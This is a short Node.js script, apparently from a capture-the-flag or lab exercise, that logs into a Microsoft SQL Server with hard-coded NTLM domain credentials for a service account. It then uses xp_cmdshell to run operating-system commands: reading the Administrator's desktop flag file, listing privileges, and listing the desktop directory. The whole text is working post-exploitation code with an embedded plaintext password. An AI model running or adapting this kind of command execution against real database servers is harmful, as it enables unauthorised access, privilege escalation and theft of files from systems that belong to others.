const sql = require("mssql");
(async () => {
  await sql.connect({
    server: "172.16.0.11",
    database: "master",
    authentication: {
      type: "ntlm",
      options: { domain: "ODYSSEY", userName: "svc-mssql", password: "cml958782" },
    },
    options: { encrypt: false, trustServerCertificate: true, enableArithAbort: true },
    port: 1433,
  });
  const q = async (s) => {
    try {
      const r = await sql.query(s);
      console.log(s.slice(0, 80), "=>", JSON.stringify(r.recordset));
    } catch (e) {
      console.log(s.slice(0, 80), "ERR", e.message);
    }
  };
  await q("EXEC xp_cmdshell 'type C:\\Users\\Administrator\\Desktop\\user.txt'");
  await q("EXEC xp_cmdshell 'whoami /priv'");
  await q("EXEC xp_cmdshell 'dir C:\\Users\\Administrator\\Desktop'");
  process.exit(0);
})();
